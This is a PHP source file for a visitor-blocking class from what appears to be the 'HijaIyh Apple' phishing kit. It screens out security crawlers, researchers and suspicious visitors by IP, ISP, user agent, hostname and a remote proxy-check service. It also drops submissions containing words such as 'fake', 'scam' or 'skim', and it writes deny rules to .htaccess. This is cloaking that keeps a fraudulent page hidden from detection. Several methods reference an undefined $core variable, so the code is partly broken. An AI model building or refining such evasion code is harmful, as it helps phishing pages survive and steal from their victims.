<?php
# HijaIyh Project.
/**
* HijaIyh Apple v3.0
* @version 3.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/

Class hiblocker{

public $ispfile = 'HijaIyh_App/config/isp-block.iyh.txt';
public $ipfile  = 'HijaIyh_App/config/ip-blacklist.iyh.txt';
public $agentfile = 'HijaIyh_App/config/useragent-block.iyh.txt';
public $hostfile = 'HijaIyh_App/config/hostname-block.iyh.txt';
public $filter_text = [ "test", "stupid", "idiot", "fuck", "fake", "anti", "temp", "stopsmoking", "plasmatv", "flowershop", "yopmail", "asdf", "qwer", "spam", "trash", "bot", "bitch", "12345", "junk", "sample", "example", "scam", "skim", "paypal", "shit", "safe", "dump", "toilet", "hacker", "kill", "dick", "suck", "warm" ];
    

public function logbot($type,$content)
{
  switch ($type) {
    case 'bot':
      $file = './HijaIyh_App/stats/bot.hijaiyh.html';
      break;
      case 'ip':
      $file = './HijaIyh_App/stats/ip-blacklist.iyh.html';
      break;
      case 'isp':
      $file = './HijaIyh_App/stats/isp-block.iyh.html';
      break;
      case 'host':
      $file = './HijaIyh_App/stats/hostname-block.iyh.html';
      break;
      case 'agent':
      $file = './HijaIyh_App/stats/useragent-block.iyh.html';
      break;
      case 'proxy':
      $file = './HijaIyh_App/stats/proxy-block.iyh.html';
      break;
      case 'badword':
      $file = './HijaIyh_App/stats/badword.iyh.html';
      break;
  }
  $core = new hicore;
  $fp = fopen($file,'a');
  fwrite($fp,$core->statsformat($content).PHP_EOL);
  fclose($fp);
}
public function filter_input($input)
{$core =new hicore;
    foreach($this->filter_text as $txt)
    {
        if(preg_match("/{$txt}/i",$input))
        {
            $this->logbot('badword','Badword bot block => '.$txt.' / '.$input);
            $this->logbot('bot','Badword bot block => '.$txt.' / '.$input);
            $core->suspend();exit;
        }
    }
}
	public function one_time($ip)
	{
		$fp = @file_put_contents('./.htaccess',"Deny from $ip \n",FILE_APPEND);
  		return $fp;
	}

  public function get_file($type)
{
  switch ($type) {
    case 'ip':
      $file = json_decode(@file_get_contents($this->ipfile),true);
      break;
    case 'isp':
      $file = json_decode(@file_get_contents($this->ispfile),true);
      break;
    case 'agent':
      $file = json_decode(@file_get_contents($this->agentfile),true);
      break;
    case 'host':
      $file = json_decode(@file_get_contents($this->hostfile),true);
      break;
  }
  return $file;
}
public function run_blocker($isp /*,$data=array()*/)
{
    $this->block_isp($isp);
    $this->block_ip();
    $this->block_agent();
    $this->block_host();
    $this->block_proxy();
    //$this->dinamic_block($data);
}
public function block_ip()
{
	$core = new hicore;
  $listip = $this->get_file('ip');
  foreach($listip as $ip)
  {
    if(preg_match("/".$ip."/i",$core->userIP()))
    {
      $this->logbot('ip',$ip.' => Blocked by IP Blacklist 2019');
      $this->logbot('bot',$ip.' => Blocked by IP Blacklist 2019');
      $core->suspend();exit;
    }
  }
}
/*
public function dinamic_block($data = array())
{
	$core = new hicore;
	$api = new hiapi($data[0],$data[1],$data[2]);
	
    $ip = $api->botIp($core->userIP());
    $agent = $api->crawler($_SERVER['HTTP_USER_AGENT']);
    //print_r($ip);print_r($data);
    if($ip['bot'] == 1 || $ip['status'] == 'valid')
    {
    $this->logbot('dinamic',$ip['ip'].' => Blocked by Dinamic blocker autoupdate 2019');
      $this->logbot('bot',$ip['ip'].' => Blocked by Dinamic blocker autoupdate 2019');
      $core->suspend();exit;
    }
    
    if($agent['bot'] == 1 || $agent['status'] == 'valid')
    {
         $this->logbot('agent',$agent['agent'].' => Blocked by  Dinamic blocker autoupdate 2019');
      $this->logbot('bot',$agent['agent'].' => Blocked by IP  Dinamic blocker autoupdate 2019');
      $core->suspend();exit;
    }
}
*/
public function block_isp($isp = null)
{
  $listisp = $this->get_file('isp');
  if($isp != null)
  {
  foreach($listisp as $ispa)
  {
    if(substr_count(strtolower($ispa),strtolower($isp)) > 0 )
    {
      $this->logbot('isp',$ispa.' => Blocked by ISP Block 2019');
      $this->logbot('bot',$ispa.' => Blocked by ISP Block 2019');
      $core->suspend();exit;
    }
  }
  }else{
    $this->logbot('bot','ISP Not detected :( ');
  }
}

public function block_agent()
{
  $listua = $this->get_file('agent');
  foreach($listua as $agent)
  {
    if(substr_count(strtolower($agent),strtolower($_SERVER['HTTP_USER_AGENT'])) > 0 )
    {
      $this->logbot('agent',$agent.' => Blocked by userAgent Block 2019');
      $this->logbot('bot',$agent.' => Blocked by userAgent Block 2019');
      $core->suspend();exit;
    }
  }
}
public function block_host()
{
  $listhost = $this->get_file('host');
  foreach($listhost as $host)
  {
    if(substr_count(strtolower($host),strtolower(gethostbyaddr($_SERVER['REMOTE_ADDR']))) > 0 )
    {
      $this->logbot('host',$host.' => Blocked by Hostname Block 2019');
      $this->logbot('bot',$host.' => Blocked by Hostname Block 2019');
      $core->suspend();exit;
    }
  }
}
  public function block_proxy()
  {
  	$core = new hicore;
    $ip = $core->userIP();
    $url = "http://proxy.mind-media.com/block/proxycheck.php?ip=".$ip;
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        $result = $resp;
        if($result == "Y") {
            $this->logbot('proxy',$ip.' => Blocked by Proxy Block 2019');
             $this->logbot('bot',$ip.' => Blocked by ProxyBlock 2019');
            $core->suspend();exit;
        }
  }

}